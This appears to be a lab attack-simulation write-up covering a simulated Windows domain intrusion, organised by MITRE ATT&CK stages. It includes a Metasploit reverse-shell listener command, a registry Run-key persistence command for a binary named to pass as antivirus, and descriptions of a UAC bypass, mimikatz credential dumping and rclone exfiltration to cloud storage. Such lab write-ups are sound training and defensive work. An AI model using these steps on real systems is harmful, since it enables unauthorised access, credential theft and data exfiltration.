# **Attack Simulation**

**Generated shellcode that will have the target connect to 192.168.1.59:4444**

![image](https://github.com/user-attachments/assets/c8ee123e-461a-4657-bbf1-58818a85f39b)

Then I set up the listener using:  `msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.59; set LPORT 4444; exploit"`

- **Payload**: windows/x64/meterpreter/reverse_tcp
- **LHOST (Listening host)**: 192.168.1.59
- **LPORT (Listening Port)**: 4444

## 1\. **(Initial Access)**

I created a basic [shellcode injector](https://github.com/shaydan12/ShellcodeInjector) that will inject shellcode into a specified process. The shellcode created from msfvenom will be placed in there.

Target runs the executable which then executes a meterpreter shell connection to 192.168.1.59 (port 4444), once I gained access I migrated to a different process

## 2\. **(Persistence)**

### **T1547 - Boot or Logon Autostart Execution**

I gained persistence by adding a new value to the Run key in the registry specifying that I want the malware to run every time Windows starts up.

`reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "123Start" /t REG_SZ /d "C:\Users\s.chisholm.mayorsec\Downloads\Antivirus.exe" /f`

![image](https://github.com/user-attachments/assets/ba42f3d2-d39a-41bd-ba41-6862d63e31cd)

## 3\. Enumeration

### **T1016 System Network Configuration Discovery**

I looked for other computers on the network using the Get-ADComputer Powershell module.

`Get-ADComputer -Filter * | Select-Object Name, DNSHostName, OperatingSystem`

![image](https://github.com/user-attachments/assets/3a3061e9-2ebe-4fcf-9a6e-b65c1f3803ee)

## 4\. (**Privilege Escalation**):

I used the "windows/local/bypassuac_sdclt" module in Metasploit to attempt to elevate my privileges to SYSTEM, the highest privilege on Windows.

![image](https://github.com/user-attachments/assets/fb89a9f6-7a2c-4e4c-919e-05a502b75cd8)

I then migrated to a process running with SYSTEM privileges in order to perform privilege escalation.  
![image](https://github.com/user-attachments/assets/34b63708-c5e8-4fa2-98c0-9008469f0850)

## 5\. (**Credential Access**), (T1003 - Credential Dumping)

I downloaded mimikatz, in order to get dump hashes and passwords.

![image](https://github.com/user-attachments/assets/fdedade4-7fcf-44d6-b612-cfc85708e356)

Cleartext Password:  
![image](https://github.com/user-attachments/assets/300c1108-6e71-42a8-8ffa-5a3354aeb722)

## 6\. **(Lateral Movement)**

I attempted to move onto the domain controller using credentials I gathered from Mimikatz and the info gathered from Get-ADComputers.

![image](https://github.com/user-attachments/assets/591cd233-0387-456b-9ace-2d4b02721eca)

&nbsp;

## 7\. **(Data Exfiltration)**

### **Exfiltration Over Web Service - T1567**

I downloaded the rclone binary to the target machine, set up the configuration and cloud storage credentials in order to exfiltrate data from a network share on the domain controller. Rclone is a legitimate command-line program used to manage files on cloud storage.

![image](https://github.com/user-attachments/assets/ff6d145a-99ba-4e12-80b9-1e8eb8012057)

![image](https://github.com/user-attachments/assets/a04e632d-a53e-4279-9066-c20c78f6f4c7)

Data exfiltrated to attacker's Mega cloud storage:  
![image](https://github.com/user-attachments/assets/61815e9e-5c12-4b3b-8f61-00ff6ffc0d24)

![image](https://github.com/user-attachments/assets/46c6413b-7f5c-4480-9576-a18cb35edf0d)
